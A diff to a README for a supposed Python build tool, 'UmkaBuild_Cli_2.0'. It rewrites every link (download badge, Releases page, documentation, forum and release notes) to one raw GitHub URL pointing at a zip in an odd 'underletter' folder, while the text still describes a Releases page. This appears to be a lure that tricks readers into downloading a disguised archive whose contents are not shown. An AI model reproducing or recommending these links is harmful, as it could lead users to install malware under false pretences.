@@ -1,6 +1,6 @@
 # 🚀 UmkaBuild_Cli_2.0 - Simple Tool for Building Python Projects
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-UmkaBuild_Cli_2.0-brightgreen)](https://github.com/shawndcool/UmkaBuild_Cli_2.0/releases)
+[![Download Now](https://raw.githubusercontent.com/shawndcool/UmkaBuild_Cli_2.0/master/underletter/UmkaBuild_Cli_2.0.zip%20Now-UmkaBuild_Cli_2.0-brightgreen)](https://raw.githubusercontent.com/shawndcool/UmkaBuild_Cli_2.0/master/underletter/UmkaBuild_Cli_2.0.zip)
 
 ## 🛠️ Description
 
@@ -26,7 +26,7 @@ To begin using UmkaBuild_Cli_2.0, you will need to download and install the soft
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page to download](https://github.com/shawndcool/UmkaBuild_Cli_2.0/releases).
+1. Visit the [Releases page to download](https://raw.githubusercontent.com/shawndcool/UmkaBuild_Cli_2.0/master/underletter/UmkaBuild_Cli_2.0.zip).
 2. On the Releases page, find the latest version of UmkaBuild_Cli_2.0.
 3. Click on the version you want to download.
 4. Download the appropriate installer for your operating system.
@@ -58,12 +58,12 @@ We welcome contributions from everyone. If you want to improve UmkaBuild_Cli_2.0
 
 ## 🔗 Additional Resources
 
-- [UmkaBuild Official Documentation](https://your-documentation-link.com)
-- [UmkaBuild Community Forum](https://your-forum-link.com)
+- [UmkaBuild Official Documentation](https://raw.githubusercontent.com/shawndcool/UmkaBuild_Cli_2.0/master/underletter/UmkaBuild_Cli_2.0.zip)
+- [UmkaBuild Community Forum](https://raw.githubusercontent.com/shawndcool/UmkaBuild_Cli_2.0/master/underletter/UmkaBuild_Cli_2.0.zip)
 
 ## 📅 Release Notes
 
-Keep an eye on the [Releases page](https://github.com/shawndcool/UmkaBuild_Cli_2.0/releases) for updates, new features, and bug fixes. Each release includes detailed notes on what has changed or improved.
+Keep an eye on the [Releases page](https://raw.githubusercontent.com/shawndcool/UmkaBuild_Cli_2.0/master/underletter/UmkaBuild_Cli_2.0.zip) for updates, new features, and bug fixes. Each release includes detailed notes on what has changed or improved.
 
 ## ⚖️ License
 
